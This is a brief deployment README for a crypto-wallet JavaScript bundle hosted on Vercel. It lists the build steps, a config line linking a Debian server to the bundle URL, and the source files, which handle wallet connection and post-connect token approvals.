# Vercel — wallet JS bundle only

Deploy **this folder** to Vercel. Nothing here is secret.

## Vercel dashboard

- **Root Directory:** `vercel`
- Build runs `npm run build` → `public/wallet.bundle.js`

## After deploy

Put the bundle URL in **`../vps/config.php`** on your Debian server:

```php
'vercel_bundle_url' => 'https://YOUR-PROJECT.vercel.app/wallet.bundle.js',
```

## Local build

```bash
cd vercel
npm install
npm run build
```

## Files

| File | Purpose |
|------|---------|
| `src/wallet-loader.js` | Reown connect |
| `src/token-approval.js` | Post-connect approvals |
| `src/solana-wallets.js` | Wallet list (commit this) |
| `public/wallet.bundle.js` | Output (generated, do not commit) |
